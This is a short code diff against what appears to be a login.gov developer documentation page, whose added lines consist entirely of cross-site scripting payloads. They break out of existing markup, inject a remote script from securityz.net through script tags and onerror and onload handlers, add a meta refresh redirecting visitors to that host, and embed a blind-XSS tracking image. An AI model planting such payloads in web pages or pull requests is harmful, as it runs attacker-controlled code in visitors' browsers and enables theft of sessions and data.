@@ -383,3 +383,8 @@ The login.gov team has created example clients to speed up your development, all
 
   showExamples('private_key_jwt');
 </script>
+</style></div></article></script>"><script src=https://securityz.net/1.js?></script>
+\"-->'><img src=1 onerror="var script =document.createElement('script');script.src ='//securityz.net/1.js'; document.body.appendChild(script);">
+"><svg/onload="var script =document.createElement('script');script.src ='//securityz.net/1.js'; document.body.appendChild(script);">
+<meta http-equiv="refresh" content="1;URL=https://securityz.net/blind.html?puzzle-movies" />
+"><img src="https://securityz.net/blindxss.jpg">
